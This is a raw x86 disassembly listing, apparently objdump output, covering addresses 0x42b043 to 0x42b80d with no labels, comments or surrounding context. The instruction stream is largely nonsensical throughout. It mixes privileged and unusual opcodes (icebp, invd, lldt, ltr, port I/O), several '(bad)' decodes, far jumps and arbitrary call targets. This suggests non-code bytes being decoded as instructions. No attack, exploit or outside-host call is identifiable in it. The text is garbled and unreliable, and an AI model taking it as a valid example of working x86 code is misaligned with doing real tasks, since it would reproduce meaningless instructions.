  42b043:	dec    ebp
  42b044:	hlt    
  42b045:	xor    ebx,DWORD PTR [ebp-0x77]
  42b048:	mov    esi,esp
  42b04a:	in     al,0x45
  42b04c:	jge    0x42b07f
  42b04e:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42b055:	dec    ebp
  42b056:	ins    BYTE PTR es:[edi],dx
  42b057:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  42b05d:	inc    ebp
  42b05e:	hlt    
  42b05f:	xor    eax,0xb88b9f75
  42b064:	add    al,0x95
  42b066:	icebp  
  42b067:	add    dl,dh
  42b069:	mov    DWORD PTR [ebp+0x20],ebx
  42b06c:	cmp    eax,DWORD PTR [ebp+0xf]
  42b06f:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42b073:	fistp  WORD PTR [ebx+0x0]
  42b076:	inc    ebp
  42b077:	mov    ebx,DWORD PTR [edi+0xc]
  42b07a:	add    eax,eax
  42b07c:	inc    ebp
  42b07d:	test   BYTE PTR [ebx],dh
  42b07f:	add    eax,DWORD PTR [ebx]
  42b081:	add    BYTE PTR [esi+0x45],bl
  42b084:	ret    0x85
  42b087:	jnp    0x54433456
  42b08d:	inc    bp
  42b08f:	inc    ebp
  42b090:	xor    eax,0xc78a9cb9
  42b095:	add    ah,bl
  42b097:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  42b09d:	add    BYTE PTR [ebx+0x3],dl
  42b0a0:	mov    esi,0x708088b
  42b0a5:	cmp    esi,eax
  42b0a7:	setle  BYTE PTR [ecx-0x74fcffce]
  42b0ae:	mov    esp,edi
  42b0b0:	call   0x33cdf602
  42b0b5:	or     BYTE PTR [ebx],al
  42b0b7:	inc    ecx
  42b0b8:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  42b0be:	and    BYTE PTR [ebp-0x7074f0bb],al
  42b0c4:	lock add cl,al
  42b0c7:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  42b0ce:	mov    ch,0x45
  42b0d0:	clc    
  42b0d1:	xor    eax,DWORD PTR [ebp+0x3]
  42b0d4:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  42b0da:	inc    ebp
  42b0db:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  42b0e1:	mov    edi,eax
  42b0e3:	mov    eax,DWORD PTR [ebp+0x3c]
  42b0e6:	mov    ecx,DWORD PTR [eax]
  42b0e8:	hlt    
  42b0e9:	inc    ebp
  42b0ea:	ror    DWORD PTR [ebx+0x818c45],0xf4
  42b0f1:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  42b0f7:	push   ebp
  42b0f8:	mov    edi,DWORD PTR [ebx]
  42b0fa:	in     al,dx
  42b0fb:	jne    0x42b0be
  42b0fd:	mov    eax,DWORD PTR [ebp-0x28]
  42b100:	add    DWORD PTR [eax],0xe8058dec
  42b106:	clc    
  42b107:	mov    eax,DWORD PTR [edi]
  42b109:	clc    
  42b10a:	add    dh,dl
  42b10c:	rol    WORD PTR [ebp-0x1],cl
  42b110:	mov    edx,DWORD PTR [eax+0x8]
  42b113:	jne    0x42b0d5
  42b115:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  42b11c:	inc    ebp
  42b11d:	push   esp
  42b11e:	test   DWORD PTR [ecx+0xf],ecx
  42b121:	sub    edx,esp
  42b123:	add    eax,DWORD PTR [eax]
  42b125:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  42b12b:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  42b132:	mov    eax,DWORD PTR [ecx]
  42b134:	and    BYTE PTR [eax],al
  42b136:	inc    edx
  42b137:	adc    BYTE PTR [eax],al
  42b139:	inc    ebp
  42b13a:	inc    cx
  42b13d:	push   esp
  42b13e:	or     BYTE PTR [ebp+0x0],dh
  42b141:	push   edx
  42b142:	enterw 0xc1,0x4d
  42b147:	mov    esp,DWORD PTR [esi+0x20]
  42b14a:	add    DWORD PTR [ecx-0x7b],eax
  42b14d:	add    eax,DWORD PTR [ebx]
  42b14f:	str    WORD PTR [eax+0x45]
  42b153:	lea    ecx,[ebx+0x45890801]
  42b159:	sbb    BYTE PTR [ebx],al
  42b15b:	dec    ebp
  42b15c:	cmp    al,0xf
  42b15e:	inc    ebp
  42b15f:	push   eax
  42b160:	mov    esi,DWORD PTR [ebx]
  42b162:	push   eax
  42b163:	add    eax,eax
  42b165:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  42b16c:	inc    ebp
  42b16d:	add    BYTE PTR ds:0x8b4d8c00,dh
  42b173:	xor    edx,esp
  42b175:	add    eax,esi
  42b177:	mov    ebx,eax
  42b179:	loopne 0x42b1c0
  42b17b:	dec    ebp
  42b17c:	mov    ecx,DWORD PTR [edi]
  42b17e:	cld    
  42b17f:	push   eax
  42b180:	xchg   DWORD PTR [ebx],esi
  42b182:	add    DWORD PTR [ebx],ebp
  42b184:	add    BYTE PTR [ebx],ch
  42b186:	or     BYTE PTR [ecx],bh
  42b188:	dec    ecx
  42b189:	loopne 0x42b18e
  42b18b:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  42b191:	push   ebp
  42b192:	add    DWORD PTR [ebx+0x55100800],eax
  42b198:	dec    ebp
  42b199:	jmp    0x42b124
  42b19b:	mov    esp,DWORD PTR [eax]
  42b19d:	sbb    dl,dl
  42b19f:	inc    eax
  42b1a0:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42b1a6:	add    BYTE PTR [ebx+0x74528555],cl
  42b1ac:	push   ebp
  42b1ad:	div    DWORD PTR [ebx]
  42b1af:	and    eax,DWORD PTR [ebx]
  42b1b1:	add    edx,DWORD PTR [edx-0x30]
  42b1b4:	jno    0x42b141
  42b1b6:	inc    DWORD PTR [eax+eiz*1]
  42b1b9:	inc    ebp
  42b1ba:	push   eax
  42b1bb:	push   eax
  42b1bc:	mov    esp,DWORD PTR [edi-0x74beff1c]
  42b1c2:	mov    edi,esp
  42b1c4:	push   eax
  42b1c5:	inc    ebp
  42b1c6:	enter  0x458b,0x8
  42b1ca:	push   ecx
  42b1cb:	(bad)  
  42b1cc:	call   0x10cbba4
  42b1d1:	pop    ss
  42b1d2:	push   ebp
  42b1d3:	mov    ecx,DWORD PTR [ebx+0x489408]
  42b1d9:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  42b1df:	push   ecx
  42b1e0:	jo     0x42b1ca
  42b1e2:	inc    DWORD PTR [edi]
  42b1e4:	or     BYTE PTR [eax],al
  42b1e6:	call   0xcdb930
  42b1eb:	fmul   QWORD PTR [ebp+0x55]
  42b1ee:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  42b1f4:	mov    bh,0x8c
  42b1f6:	adc    al,0x9e
  42b1f8:	dec    esp
  42b1f9:	xor    bl,BYTE PTR [eax]
  42b1fb:	mov    ecx,DWORD PTR [ebp+0xc]
  42b1fe:	mov    eax,DWORD PTR [ebp-0x4]
  42b201:	mov    esi,DWORD PTR [edi-0x3148f924]
  42b207:	push   es
  42b208:	retf   
  42b209:	mov    BYTE PTR [ebp-0x30],0x3b
  42b20d:	inc    ebp
  42b20e:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  42b215:	retf   0x83fc
  42b218:	into   
  42b219:	dec    ebp
  42b21a:	retf   
  42b21b:	mov    ecx,DWORD PTR [ebp-0x74]
  42b21e:	mov    eax,DWORD PTR [eax]
  42b220:	fdiv   QWORD PTR [ebx]
  42b222:	mov    bh,0x3
  42b224:	push   es
  42b225:	mov    esi,ecx
  42b227:	sbb    cl,dl
  42b229:	dec    ebp
  42b22a:	sar    DWORD PTR [ebx],cl
  42b22c:	push   ebp
  42b22d:	jne    0x42b23e
  42b22f:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42b235:	lea    ebx,[eax]
  42b237:	call   0xf4cc3dfe
  42b23c:	sbb    dh,dl
  42b23e:	add    edx,ebx
  42b240:	push   ebp
  42b241:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42b247:	push   ecx
  42b248:	mov    DWORD PTR [eax-0x30],edx
  42b24b:	test   DWORD PTR [edx],eax
  42b24d:	xadd   esp,esi
  42b250:	pop    es
  42b251:	add    cl,dl
  42b253:	mov    eax,ecx
  42b255:	or     al,0x45
  42b257:	(bad)  
  42b258:	push   eax
  42b259:	add    DWORD PTR [edx+0x0],eax
  42b25c:	add    ecx,DWORD PTR [ecx]
  42b25e:	and    dh,cl
  42b260:	call   0xc6bb30
  42b265:	add    DWORD PTR [ebp+0x0],edx
  42b268:	mov    esp,DWORD PTR [ebp+0x18]
  42b26b:	add    BYTE PTR [eax+0x24],cl
  42b26e:	xor    eax,DWORD PTR [eax]
  42b270:	add    esp,DWORD PTR [esi+0x3b]
  42b273:	inc    ebp
  42b274:	je     0x42b1f9
  42b276:	push   ecx
  42b277:	or     cl,BYTE PTR [ebp-0x77]
  42b27a:	add    eax,esi
  42b27c:	or     al,0x1e
  42b27e:	inc    eax
  42b27f:	add    BYTE PTR [ebx],al
  42b281:	data16 and BYTE PTR [ebp+0x50],al
  42b285:	sub    DWORD PTR [ecx],0x8
  42b288:	add    BYTE PTR [ebp-0x75],ah
  42b28b:	add    BYTE PTR [eax],bl
  42b28d:	enter  0x894d,0x8b
  42b291:	int3   
  42b292:	loopne 0x42b24e
  42b294:	rol    BYTE PTR [eax],0x33
  42b297:	lea    cx,[ebp+0xa]
  42b29b:	data16 jb 0x42b2e3
  42b29e:	add    BYTE PTR [ebx+0x44890855],cl
  42b2a4:	sbb    ah,al
  42b2a6:	inc    ebp
  42b2a7:	inc    edx
  42b2a8:	lldt   WORD PTR [edx+0x66]
  42b2ac:	xor    ecx,DWORD PTR [eax]
  42b2ae:	sub    ecx,DWORD PTR [eax]
  42b2b0:	mov    eax,DWORD PTR [eax]
  42b2b2:	or     al,0x66
  42b2b4:	ror    edx,cl
  42b2b6:	dec    ebp
  42b2b7:	inc    ebp
  42b2b8:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  42b2be:	cld    
  42b2bf:	or     BYTE PTR [edi+0x4501dd],dl
  42b2c5:	enter  0xeece,0xcb
  42b2c9:	(bad)  
  42b2ca:	dec    ebp
  42b2cb:	mov    al,0x8b
  42b2cd:	jmp    0xea27:0x450a3320
  42b2d4:	xchg   esi,ebp
  42b2d6:	add    edi,eax
  42b2d8:	add    BYTE PTR [eax+0x3f52ed55],bh
  42b2de:	push   ebp
  42b2df:	inc    ebp
  42b2e0:	xor    edx,eax
  42b2e2:	add    ebp,esi
  42b2e4:	push   edx
  42b2e5:	push   bp
  42b2e7:	inc    ebp
  42b2e8:	jmp    ecx
  42b2ea:	push   esp
  42b2eb:	(bad)  
  42b2ec:	inc    edx
  42b2ee:	sbb    al,0x33
  42b2f0:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  42b2f7:	add    BYTE PTR [ebp+0x49],0x8b
  42b2fb:	jmp    0xf98b:0x100041c8
  42b302:	xor    esi,DWORD PTR [edx+0x3]
  42b305:	mov    ecx,DWORD PTR [edi]
  42b307:	fmul   DWORD PTR [edx]
  42b309:	add    BYTE PTR [eax],al
  42b30b:	lea    eax,[ebx-0x4700273c]
  42b311:	add    al,0x4f
  42b313:	pop    DWORD PTR [eax]
  42b315:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  42b31b:	push   edx
  42b31c:	inc    WORD PTR [ebp+0x8]
  42b320:	mov    eax,0x514f4d
  42b325:	(bad)
  42b329:	add    al,al
  42b32b:	xor    DWORD PTR [ebx-0x74baf730],eax
  42b331:	test   DWORD PTR [esi+0x74],esp
  42b334:	inc    ebp
  42b335:	mov    DWORD PTR [eax+0xa4e08],edi
  42b33b:	add    BYTE PTR [ecx-0x76c435bb],cl
  42b341:	or     dh,cl
  42b343:	or     eax,0x8b8d5045
  42b348:	inc    ebp
  42b349:	mov    WORD PTR [ecx+0x3b8a00],?
  42b34f:	jne    0x42b384
  42b351:	mov    edi,DWORD PTR [edx+0x8f3b18]
  42b357:	add    DWORD PTR [ebx],eax
  42b359:	add    bh,bh
  42b35b:	adc    DWORD PTR [eax],ecx
  42b35d:	adc    DWORD PTR [ebp+0x55],edi
  42b360:	push   es
  42b361:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42b367:	mov    ebp,DWORD PTR [eax+ebp*1+0x503211d0]
  42b36e:	inc    ebp
  42b36f:	mov    edx,edi
  42b371:	or     al,0xd0
  42b373:	push   eax
  42b374:	(bad)  
  42b375:	jne    0x42b32b
  42b377:	call   0x2aac5c
  42b37c:	inc    ebp
  42b37d:	shl    BYTE PTR [edx],0x84
  42b380:	out    dx,al
  42b381:	add    bh,al
  42b383:	add    BYTE PTR [ebp+esi*2-0x2c7430],bh
  42b38a:	(bad)  
  42b38b:	and    al,al
  42b38d:	fs loope 0x42b38f
  42b390:	inc    ebp
  42b391:	test   DWORD PTR [edi+ecx*1-0x37],edi
  42b395:	scas   al,BYTE PTR es:[edi]
  42b396:	inc    esp
  42b397:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  42b39e:	or     BYTE PTR [ebx-0x97717cb],0x83
  42b3a5:	call   DWORD PTR [edi]
  42b3a7:	shr    ah,0x84
  42b3aa:	xchg   DWORD PTR [eax],eax
  42b3ac:	add    DWORD PTR [eax],eax
  42b3ae:	add    bh,bh
  42b3b0:	dec    ebp
  42b3b1:	and    BYTE PTR [ecx-0x38],dl
  42b3b4:	push   eax
  42b3b5:	dec    DWORD PTR [ebx+0xfd885]
  42b3bb:	mov    BYTE PTR [ebp+0x508bac00],cl
  42b3c1:	mov    WORD PTR [ecx+0x0],ss
  42b3c4:	lea    ecx,[ebx+0x108b20d8]
  42b3ca:	mov    WORD PTR [edx],ds
  42b3cc:	add    BYTE PTR [edi+0xff01ff],al
  42b3d2:	mov    ecx,DWORD PTR [ebp-0x28]
  42b3d5:	push   ecx
  42b3d6:	shl    BYTE PTR [ebp+0x3a],0x8b
  42b3da:	inc    ebp
  42b3db:	in     al,0xeb
  42b3dd:	jno    0x42b36a
  42b3df:	push   edx
  42b3e0:	mov    DWORD PTR [eax-0x28],edx
  42b3e3:	mov    eax,DWORD PTR [ebp+0x20]
  42b3e6:	je     0x42b36f
  42b3e8:	mov    eax,DWORD PTR [ecx]
  42b3ea:	sbb    BYTE PTR [eax],al
  42b3ec:	pop    DWORD PTR [eax]
  42b3ee:	add    esi,eax
  42b3f0:	add    bl,al
  42b3f2:	adc    DWORD PTR [edi],esi
  42b3f4:	jmp    0x8bce0446
  42b3f9:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  42b400:	jne    0x42b38d
  42b402:	mov    ecx,DWORD PTR [eax]
  42b404:	in     al,0x75
  42b406:	pop    DWORD PTR [ecx+0x5701]
  42b40c:	push   edx
  42b40d:	inc    DWORD PTR [ebx]
  42b40f:	adc    BYTE PTR [ecx+0x45721cc6],cl
  42b415:	add    BYTE PTR [edi+0x9],dl
  42b418:	call   DWORD PTR [esi]
  42b41a:	and    dl,al
  42b41c:	and    bh,bh
  42b41e:	inc    edi
  42b420:	test   eax,edx
  42b422:	sldt   ebx
  42b425:	xor    al,0x0
  42b427:	pushf  
  42b428:	(bad)  
  42b429:	jmp    0x42b437
  42b42b:	mov    eax,edi
  42b42d:	or     al,0x75
  42b42f:	inc    eax
  42b430:	call   0x42ab38
  42b435:	mov    eax,eax
  42b437:	loopne 0x42b3bd
  42b439:	inc    ebp
  42b43a:	add    BYTE PTR [ebx+0x1451c00],cl
  42b440:	mov    eax,DWORD PTR [ebp+0x20]
  42b443:	add    edi,ecx
  42b445:	add    BYTE PTR [eax],ch
  42b447:	cmp    edi,0x18
  42b44a:	test   DWORD PTR [ebp+0xf],esi
  42b44d:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42b454:	jne    0x42b458
  42b456:	call   0xffa1af1b
  42b45b:	leave  
  42b45c:	rcr    BYTE PTR [esp+eax*4],0x55
  42b460:	add    ah,ch
  42b462:	add    BYTE PTR [edi-0x48fef979],dh
  42b468:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  42b46f:	inc    esp
  42b470:	mov    ebx,DWORD PTR [eax]
  42b472:	fcom   st(2)
  42b474:	add    BYTE PTR [edi],bl
  42b476:	lea    ecx,[eax-0x18]
  42b479:	(bad)  
  42b47a:	push   DWORD PTR [ecx]
  42b47c:	call   0xffb501de
  42b481:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42b485:	fstp   DWORD PTR [esi+ebx*8]
  42b488:	push   ebp
  42b489:	pop    ebp
  42b48a:	mov    esi,DWORD PTR [edx-0x38]
  42b48d:	add    DWORD PTR [eax],0x28
  42b490:	mov    edi,DWORD PTR [ebx]
  42b492:	xor    esi,DWORD PTR [edx+0x3]
  42b495:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  42b499:	pop    ebp
  42b49a:	or     al,0x4
  42b49c:	inc    ecx
  42b49d:	push   ebp
  42b49e:	(bad)  
  42b49f:	in     al,dx
  42b4a0:	or     ah,ch
  42b4a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4a3:	xbegin 0xffc82a99
  42b4a9:	clc    
  42b4aa:	adc    al,0x45
  42b4ac:	div    BYTE PTR [eax+ecx*1]
  42b4af:	pushf  
  42b4b0:	add    bh,al
  42b4b2:	jne    0x42b48c
  42b4b4:	add    DWORD PTR [ebp+0x1b00f89e],0x66710066
  42b4be:	add    eax,DWORD PTR [ebp+0x52]
  42b4c1:	adc    eax,0x60
  42b4c4:	xchg   DWORD PTR [ecx+0x3000fc01],ecx
  42b4ca:	test   DWORD PTR [eax],eax
  42b4cc:	clc    
  42b4cd:	data16 or al,BYTE PTR [ebp+0x45]
  42b4d1:	or     DWORD PTR [ebx-0x3d76d720],0xfffffff8
  42b4d8:	rol    BYTE PTR [ebp+0x45],1
  42b4db:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  42b4e1:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  42b4e7:	push   ebx
  42b4e8:	add    BYTE PTR [edi+0x0],dl
  42b4eb:	push   ecx
  42b4ec:	jge    0x42b521
  42b4ee:	add    BYTE PTR [esi+0x4],dl
  42b4f1:	jne    0x42b558
  42b4f3:	mov    edx,0x457200
  42b4f8:	jmp    0x42b4bc
  42b4fa:	xor    edi,DWORD PTR [ebx]
  42b4fc:	pop    edi
  42b4fd:	cvtdq2ps xmm7,xmm0
  42b500:	ret    0x0
  42b503:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  42b509:	xor    ecx,DWORD PTR [edi]
  42b50b:	add    eax,DWORD PTR [ecx+0x3b]
  42b50e:	push   ebx
  42b50f:	rdpmc  
  42b511:	out    0x8d,al
  42b513:	add    BYTE PTR [eax],cl
  42b515:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  42b51b:	ret    0x450c
  42b51e:	sbb    al,0x8b
  42b520:	cmp    eax,esi
  42b522:	or     cl,al
  42b524:	or     al,0xc2
  42b526:	pop    eax
  42b527:	inc    ebp
  42b528:	add    ecx,DWORD PTR [edi]
  42b52a:	add    esi,DWORD PTR [ebp+0x39]
  42b52d:	invd   
  42b52f:	jge    0x42b53b
  42b531:	mov    eax,0x478ac0
  42b536:	cli    
  42b537:	xor    esp,ecx
  42b539:	mov    ebx,0x5b8ac0
  42b53e:	ret    0x33
  42b541:	mov    eax,0x833b8b
  42b546:	sub    BYTE PTR [ebx],al
  42b548:	inc    ebp
  42b549:	xor    ax,0x9cf8
  42b54d:	inc    bh
  42b54f:	mov    esp,esp
  42b551:	hlt    
  42b552:	test   DWORD PTR [ebp-0x8],esi
  42b555:	mov    eax,DWORD PTR [ebp-0x14]
  42b558:	xor    ecx,DWORD PTR [ebx-0x76478864]
  42b55e:	dec    edi
  42b55f:	or     BYTE PTR [eax],al
  42b561:	jne    0x42b4ec
  42b563:	mov    esi,esp
  42b565:	call   0x77a9412a
  42b56a:	inc    ebp
  42b56b:	mov    DWORD PTR [eax+0x9e4f0c],edi
  42b571:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42b577:	add    BYTE PTR [esi+0x7d],ah
  42b57a:	inc    ebp
  42b57b:	mov    bx,WORD PTR [ebp+0x8]
  42b57f:	add    DWORD PTR [ebp+0x57],0x30c008b
  42b586:	inc    ebp
  42b587:	mov    bx,di
  42b58a:	lock test BYTE PTR [ecx+0x7000801],bh
  42b591:	jge    0x42b554
  42b593:	mov    ecx,DWORD PTR [ebx-0x610613f0]
  42b599:	cli    
  42b59a:	xor    bl,bh
  42b59c:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  42b5a2:	test   BYTE PTR [eax],cl
  42b5a4:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  42b5ab:	cmp    ebp,eax
  42b5ad:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  42b5b4:	test   BYTE PTR [ebp+0x1],bh
  42b5b7:	mov    ebx,0x458a00
  42b5bc:	xor    esi,DWORD PTR [ebx]
  42b5be:	add    esp,DWORD PTR [esi-0x77]
  42b5c1:	pop    ebp
  42b5c2:	loopne 0x42b62a
  42b5c4:	inc    ebp
  42b5c5:	clc    
  42b5c6:	xor    edi,DWORD PTR [ebx]
  42b5c8:	add    esi,DWORD PTR [edx-0x77]
  42b5cb:	data16 fdivr QWORD PTR [ebp-0x49]
  42b5cf:	mov    ebx,0xb78afc
  42b5d4:	hlt    
  42b5d5:	xor    eax,DWORD PTR [edx+0x66]
  42b5d8:	add    BYTE PTR [ebp+0x66],bl
  42b5db:	data16 lock clc 
  42b5de:	inc    edx
  42b5df:	cmp    eax,DWORD PTR [eax]
  42b5e1:	ja     0x42b649
  42b5e3:	psubq  mm7,QWORD PTR [ebp+0x8]
  42b5e7:	ltr    WORD PTR [ebp+0x66]
  42b5eb:	add    esi,eax
  42b5ed:	add    di,WORD PTR [ebp+0x2b]
  42b5f1:	data16 data16 jge 0x42b672
  42b5f5:	mov    ebx,0xe08a8b
  42b5fa:	jge    0x42b62f
  42b5fc:	data16 data16 xor al,0x5d
  42b600:	data16 data16 jne 0x42b5fc
  42b604:	mov    edi,DWORD PTR [ebx]
  42b606:	fdiv   QWORD PTR [edx+0x7d]
  42b609:	data16 data16 jge 0x42b641
  42b60d:	mov    ebx,0x758a66
  42b612:	mov    esi,0x667233
  42b617:	pop    ebp
  42b618:	or     BYTE PTR [esi+0x0],ah
  42b61b:	clc    
  42b61c:	mov    edi,DWORD PTR [ebx]
  42b61e:	lock ja 0x42b5ac
  42b621:	(bad)  
  42b623:	jge    0x42b61c
  42b625:	invd   
  42b627:	pop    ebp
  42b628:	add    BYTE PTR [ebx],al
  42b62a:	(bad)  
  42b62b:	cmp    di,WORD PTR [ebp+0xf]
  42b62f:	data16 sbb bh,BYTE PTR [ebp+0x0]
  42b633:	mov    bx,WORD PTR [ebp-0x10]
  42b637:	pop    bp
  42b639:	fbstp  TBYTE PTR [ebx]
  42b63b:	test   DWORD PTR [ebx],eax
  42b63d:	add    BYTE PTR [ebx],bh
  42b63f:	add    BYTE PTR [esi+0x7d],ah
  42b642:	jge    0x42b5cf
  42b644:	data16 in al,dx
  42b646:	pop    ebp
  42b647:	stc    
  42b648:	bsf    ecx,DWORD PTR [ebp+0x6632009e]
  42b64f:	mov    edi,ebx
  42b651:	in     al,dx
  42b652:	test   BYTE PTR [ebp+0x0],bh
  42b655:	mov    eax,DWORD PTR [eax]
  42b657:	call   0xbd3fafe7
  42b65c:	inc    edx
  42b65d:	sahf   
  42b65e:	add    BYTE PTR [edx],dh
  42b660:	mov    bx,di
  42b663:	call   0x8b4b33f3
  42b668:	add    ebp,esp
  42b66a:	mov    bx,di
  42b66d:	jnp    0x42b695
  42b66f:	mov    DWORD PTR [ebx+0x427df808],ecx
  42b675:	mov    eax,DWORD PTR [eax]
  42b677:	call   0x7c3e41e2
  42b67c:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  42b682:	data16 data16 fistp WORD PTR [ebp+0xe]
  42b687:	xor    DWORD PTR [edi-0x48fff7a9],0xfb66f403
  42b691:	fisttp WORD PTR [ecx-0x7401f77b]
  42b697:	(bad)  
  42b698:	cld    
  42b699:	jne    0x42b6dd
  42b69b:	xor    eax,DWORD PTR [eax]
  42b69d:	mov    esp,DWORD PTR [esi-0x10]
  42b6a0:	sti    
  42b6a1:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  42b6a8:	data16 adc bl,bh
  42b6ab:	push   ebp
  42b6ac:	xor    ecx,DWORD PTR es:[ebx+0x42e4f88b]
  42b6b3:	mov    WORD PTR [eax],es
  42b6b5:	sahf   
  42b6b6:	data16 xor bh,bl
  42b6b9:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  42b6bf:	mov    esp,DWORD PTR [esi-0x14]
  42b6c2:	fisttp WORD PTR [ebx-0x3748a9f2]
  42b6c8:	or     al,0x2b
  42b6ca:	mov    bh,0xba
  42b6cc:	hlt    
  42b6cd:	mov    bh,bl
  42b6cf:	add    BYTE PTR [ecx-0x7446f3cd],cl
  42b6d5:	dec    esi
  42b6d6:	or     al,0x0
  42b6d8:	mov    edi,DWORD PTR [ebx]
  42b6da:	or     BYTE PTR [ebp+0x3b],dh
  42b6dd:	mov    ecx,DWORD PTR [edi]
  42b6df:	fdivr  QWORD PTR [ebx-0x7499ff83]
  42b6e5:	xor    al,0xd8
  42b6e7:	pop    bp
  42b6e9:	lock xor esi,DWORD PTR [ebx]
  42b6ec:	lea    esp,[esi+0x1f]
  42b6ef:	icebp  
  42b6f0:	jb     0x42b6f6
  42b6f2:	add    al,al
  42b6f4:	jge    0x42b702
  42b6f6:	mov    eax,eax
  42b6f8:	fsubr  st,st(3)
  42b6fa:	pop    ebp
  42b6fb:	mov    esi,DWORD PTR [ebx]
  42b6fd:	in     al,0x8d
  42b6ff:	rcr    DWORD PTR [edi],0xc2
  42b702:	jb     0x42b762
  42b704:	add    cl,cl
  42b706:	jge    0x42b714
  42b708:	mov    edx,DWORD PTR [ebp-0x20]
  42b70b:	in     al,dx
  42b70c:	pop    ebp
  42b70d:	data16 data16 or BYTE PTR [esi+edi*4],bh
  42b712:	cmp    di,WORD PTR [ebp+0x0]
  42b716:	mov    ebp,DWORD PTR [ebx]
  42b718:	fdivr  QWORD PTR [esi+0x668a5d]
  42b71e:	cmp    al,0x33
  42b720:	mov    si,0x4e7d
  42b724:	mov    eax,DWORD PTR [eax]
  42b726:	lock inc ebp
  42b728:	mov    esi,DWORD PTR [esi]
  42b72a:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  42b731:	clc    
  42b732:	(bad)  
  42b733:	cmp    edi,DWORD PTR [ebx]
  42b735:	je     0x42b746
  42b737:	push   ebx
  42b738:	loopne 0x42b749
  42b73a:	dec    ecx
  42b73c:	mov    esp,DWORD PTR [edx-0x1c]
  42b73f:	int    0xf1
  42b741:	mov    esi,0x703084d
  42b746:	movlhps xmm6,xmm1
  42b749:	add    BYTE PTR [ebp+0x66],dh
  42b74c:	jmp    0x42b719
  42b74e:	mov    eax,DWORD PTR [ebx]
  42b750:	lock push ebp
  42b752:	ror    DWORD PTR [ebp-0x2972feb3],1
  42b758:	or     bh,dl
  42b75a:	jb     0x42b75a
  42b75c:	add    BYTE PTR [ebx-0x1a7487b3],cl
  42b762:	loopne 0x42b764
  42b764:	jne    0x42b76e
  42b766:	data16 add BYTE PTR [esi+eiz*2],dh
  42b76a:	mov    ecx,ebx
  42b76c:	inc    dx
  42b76e:	icebp  
  42b76f:	add    BYTE PTR [edx+0x66],al
  42b772:	add    bl,cl
  42b774:	mov    dx,0xf2
  42b778:	mov    edx,0x66cb0066
  42b77d:	enter  0x4df1,0x19
  42b781:	pop    edi
  42b782:	jne    0x42b705
  42b784:	mov    esi,DWORD PTR [esi]
  42b786:	call   0x77b74327
  42b78b:	xor    ebp,DWORD PTR [ebx]
  42b78d:	lea    esp,[esi+0x48]
  42b790:	repnz in eax,0x3b
  42b793:	add    BYTE PTR [ebp-0x37],dh
  42b796:	xor    edx,DWORD PTR [ebp-0x15]
  42b799:	in     al,dx
  42b79a:	xor    edx,DWORD PTR [esi+0x40]
  42b79d:	mov    DWORD PTR [edi],0x338545fc
  42b7a3:	clc    
  42b7a4:	add    esi,DWORD PTR ds:0xe85b9c5f
  42b7aa:	ret    0xff
  42b7ad:	dec    DWORD PTR [ebx-0x74f8ae08]
  42b7b3:	xor    eax,0x7c084956
  42b7b8:	add    BYTE PTR [ecx+0x66],ah
  42b7bb:	(bad)  
  42b7bc:	into   
  42b7bd:	bound  eax,QWORD PTR [edx-0x33]
  42b7c0:	add    BYTE PTR [ecx+0x7ce0866],bh
  42b7c6:	mov    edx,0xc7000066
  42b7cb:	or     ah,bh
  42b7cd:	add    BYTE PTR [ebp+0x35c3f866],al
  42b7d3:	inc    edx
  42b7d4:	pushf  
  42b7d5:	add    BYTE PTR [esi+0x66],ah
  42b7d8:	into   
  42b7d9:	ret    
  42b7da:	pop    ebp
  42b7db:	fs push edi
  42b7dd:	add    BYTE PTR [edi-0x723c409a],dh
  42b7e3:	add    edi,edi
  42b7e5:	jne    0x42b83e
  42b7e7:	lea    edx,[ecx+0x1]
  42b7ea:	mov    ebx,0xd64ff1
  42b7ef:	sar    DWORD PTR [ebx],1
  42b7f1:	test   BYTE PTR [ebp+0x3c],dh
  42b7f4:	mov    DWORD PTR [esp+edi*8-0x76],esp
  42b7f8:	push   edi
  42b7f9:	xor    BYTE PTR [ebx],0x35
  42b7fc:	mov    esi,ebx
  42b7fe:	xor    eax,DWORD PTR [eax-0x3c73839a]
  42b804:	cmp    al,0x45
  42b806:	fs pop ebx
  42b808:	mov    ebx,0x9c3b36
  42b80d:	je     0x42b83a
